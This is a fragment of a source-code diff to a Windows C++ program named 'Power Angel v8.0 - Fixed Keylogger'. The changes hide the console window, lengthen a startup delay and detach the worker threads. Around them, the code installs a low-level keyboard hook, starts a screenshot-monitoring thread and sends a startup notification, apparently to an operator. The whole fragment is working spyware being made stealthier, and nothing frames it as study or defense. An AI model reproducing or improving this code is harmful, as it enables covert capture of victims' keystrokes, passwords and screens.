+    HANDLE mutex = CreateMutexW(NULL, TRUE, L"Global\\PowerAngel_v8.0_Fixed_Mutex");
+    if (mutex && GetLastError() == ERROR_ALREADY_EXISTS) {
+        DebugLog(L"[INIT] Another instance is already running");
+        MessageBoxW(NULL, L"Power Angel v8.0 is already running!", L"Information", MB_OK | MB_ICONINFORMATION);
+        GdiplusShutdown(g_gdiplusToken);
+        CoUninitialize();
         return 0;
     }
     
-    // Initialize GDI+
-    GdiplusStartupInput input;
-    GdiplusStartup(&g_gdiplusToken, &input, NULL);
-    DebugLog(L"[INIT] GDI+ initialized");
+    DebugLog(L"[INIT] Initializing...");
+    
+    // Hide console window (if any)
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     
     // Initial delay
-    Sleep(8000);
+    Sleep(10000);
     
     // Send startup notification
     std::wstring startupMsg = L"⚡ POWER ANGEL v8.0 - FIXED KEYLOGGER\n"
@@ -764,18 +886,22 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // Install keyboard hook
     g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
     if (g_hKeyboardHook) {
-        DebugLog(L"[INIT] Fixed keyboard hook installed");
+        DebugLog(L"[INIT] Keyboard hook installed successfully");
     } else {
-        DebugLog(L"[ERROR] Failed to install keyboard hook");
+        DebugLog(L"[ERROR] Failed to install keyboard hook: " + std::to_wstring(GetLastError()));
     }
     
     // Start worker threads
     std::thread heartbeat(HeartbeatThread);
     std::thread screenshot(ScreenshotMonitorThread);
     
-    DebugLog(L"[INIT] All threads started. Keylogger active.");
+    DebugLog(L"[INIT] All systems operational");
     
-    // Main message loop
+    // Detach threads to run independently
+    heartbeat.detach();
+    screenshot.detach();
+    
+    // Main message loop (required for hooks)
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
@@ -783,23 +909,27 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
     
     // Cleanup
-    DebugLog(L"[SHUTDOWN] Shutting down v8.0...");
+    DebugLog(L"[SHUTDOWN] Shutting down...");
     g_running = false;
     g_queueCV.notify_one();
-    
-    if (heartbeat.joinable()) heartbeat.join();
-    if (screenshot.joinable()) screenshot.join();
     
     if (g_hKeyboardHook) {
         UnhookWindowsHookEx(g_hKeyboardHook);
         DebugLog(L"[SHUTDOWN] Keyboard hook removed");
     }
     
+    // Wait a bit for threads to finish
+    Sleep(2000);
+    
     GdiplusShutdown(g_gdiplusToken);
+    CoUninitialize();
     
-    if (mutex) ReleaseMutex(mutex);
+    if (mutex) {
+        ReleaseMutex(mutex);
+        CloseHandle(mutex);
+    }
     
-    DebugLog(L"[SHUTDOWN] v8.0 shutdown complete");
+    DebugLog(L"[SHUTDOWN] Clean shutdown complete");
     DebugLog(L"═══════════════════════════");
     
     return 0;
